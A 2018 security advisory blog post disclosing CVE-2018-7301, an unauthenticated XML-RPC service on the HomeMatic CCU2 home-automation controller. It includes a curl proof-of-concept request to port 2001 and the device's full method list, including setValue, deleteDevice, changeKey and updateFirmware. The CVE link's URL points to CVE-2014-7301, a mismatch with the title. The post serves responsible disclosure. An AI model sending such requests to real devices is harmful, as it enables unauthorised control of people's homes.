---
layout: post
title: "CVE-2018-7301: Unauthenticated XML-RPC Service in HomeMatic CCU2"
date:   2018-02-21 13:00:00
image:
      url: /assets/article_images/2016-05-30-inspec-cis-docker/cover.jpeg
video: false
comments: true
theme_color: 302F2D

author: 'Patrick Münch'

author_image: "https://avatars0.githubusercontent.com/u/7220740?s=400"
author_link: "https://twitter.com/atomiczero111"
---

# Background

HomeMatic is a home automation system consisting of various components for automating several parts of a building, including different sensors and actuators. The HomeMatic CCU2 is a central control unit, which is responsible for integrating these components with each other.

From the vendor's website ([eQ-3](http://www.eq-3.de/produkte/homematic/zentralen-und-gateways.html)):

"The Homematic Central Control Unit CCU2 is responsible for numerous control, signalling and supervision functions across all areas of the Homematic system. The device includes a browser based user interface to the up the system. It can be controlled in the local network as well as via Internet. The Homematic software offers various configuration and application possibilities, so that there are no limits to creativity for installing your individual smart home."

# Issue Description

While analyzing the available ports of the CCU2, an open XML-RPC port without authentication has been identified. This can be exploited by sending arbitrary XML-RPC request to control the attached bidcos-devices.

The following request illustrates the problem:

```
curl -v -H "Content-Type:text/xml" -d "<?xml version="1.0"?><methodCall>
<methodName>system.listMethods</methodName><params/></methodCall>"
http://192.168.2.145:2001
```

The following response shows that the system successfully processed the unauthenticated request:

~~~
HTTP/1.1 200 OK
Server: XMLRPC++ 0.7
Content-Type: text/xml
Content-length: 1736

<?xml version="1.0"?>
<methodResponse>
  <params>
    <param>
      <value>
        <array>
          <data>
            <value>abortDeleteDevice</value>
            <value>activateLinkParamset</value>
            <value>addDevice</value>
            <value>addLink</value>
            <value>addVirtualDeviceInstance</value>
            <value>changeKey</value>
            <value>clearConfigCache</value>
            <value>deleteDevice</value>
            <value>deleteVolatileMetadata</value>
            <value>determineParameter</value>
            <value>exit</value>
            <value>getAllMetadata</value>
            <value>getDeviceDescription</value>
            <value>getInstallMode</value>
            <value>getKeyMismatchDevice</value>
            <value>getLinkInfo</value>
            <value>getLinkPeers</value>
            <value>getLinks</value>
            <value>getMetadata</value>
            <value>getParamset</value>
            <value>getParamsetDescription</value>
            <value>getParamsetId</value>
            <value>getServiceMessages</value>
            <value>getValue</value>
            <value>getVersion</value>
            <value>getVolatileMetadata</value>
            <value>hasVolatileMetadata</value>
            <value>init</value>
            <value>listBidcosInterfaces</value>
            <value>listDevices</value>
            <value>listReplaceableDevices</value>
            <value>listTeams</value>
            <value>logLevel</value>
            <value>ping</value>
            <value>putParamset</value>
            <value>refreshDeployedDeviceFirmwareList</value>
            <value>removeLink</value>
            <value>replaceDevice</value>
            <value>reportValueUsage</value>
            <value>restoreConfigToDevice</value>
            <value>rssiInfo</value>
            <value>setBidcosInterface</value>
            <value>setInstallMode</value>
            <value>setInterfaceClock</value>
            <value>setLinkInfo</value>
            <value>setMetadata</value>
            <value>setRFLGWInfoLED</value>
            <value>setTeam</value>
            <value>setTempKey</value>
            <value>setValue</value>
            <value>setVolatileMetadata</value>
            <value>system.listMethods</value>
            <value>system.methodHelp</value>
            <value>updateFirmware</value>
            <value>system.multicall</value>
          </data>
        </array>
      </value>
    </param>
  </params>
</methodResponse>
~~~~

# CVE

[CVE-2018-7301](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7301)

# Credit

Patrick Muench of [SVA Systemvertrieb Alexander GmbH](https://www.sva.de)

Gregor Kopf of [Secfault Security GmbH](https://secfault-security.com)

# Disclaimer

The information provided is released "as is" without warranty of any kind. The publisher disclaims all warranties, either express or implied, including all warranties of merchantability. No responsibility is taken for the correctness of this information. In no event shall the publisher be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if the publisher has been advised of the possibility of such damages.

The contents of this advisory are copyright (c) 2017 Secfault Security GmbH & SVA System Vertrieb Alexander GmbH and may be distributed freely provided that no fee is charged for this distribution and proper credit is given.
